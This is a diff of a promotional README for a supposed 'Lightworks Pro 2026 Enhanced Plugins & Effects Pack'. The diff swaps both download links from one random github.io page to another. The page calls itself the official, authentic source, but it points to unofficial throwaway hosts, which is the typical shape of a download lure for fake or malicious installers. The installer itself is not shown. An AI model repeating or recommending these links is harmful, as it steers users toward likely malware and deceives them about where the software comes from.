@@ -2,7 +2,7 @@
 
 Lightworks Pro 2026 Enhanced Plugins & Effects Pack is the definitive collection designed to supercharge your professional video editing workflow. This comprehensive suite provides access to a vast library of advanced effects, unique transitions, and performance-optimizing tools that fully integrate with the latest 2026 version of Lightworks Pro, unlocking its maximum creative potential.
 
-[![Download Installer](https://img.shields.io/badge/Download-Latest_Suite-brightgreen?style=for-the-badge&logo=windows)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Latest_Suite-brightgreen?style=for-the-badge&logo=windows)](https://capitals-707-bringing.github.io/download-page/)
 
 ## What's Inside: Key Features
 
@@ -56,4 +56,4 @@ A: Yes. Once the suite is installed successfully, all effects, plugins, and tran
 
 To get the latest version of the Lightworks Pro Enhanced Plugins & Effects Pack, please visit our official download page. This ensures you receive the authentic and most recent update.
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
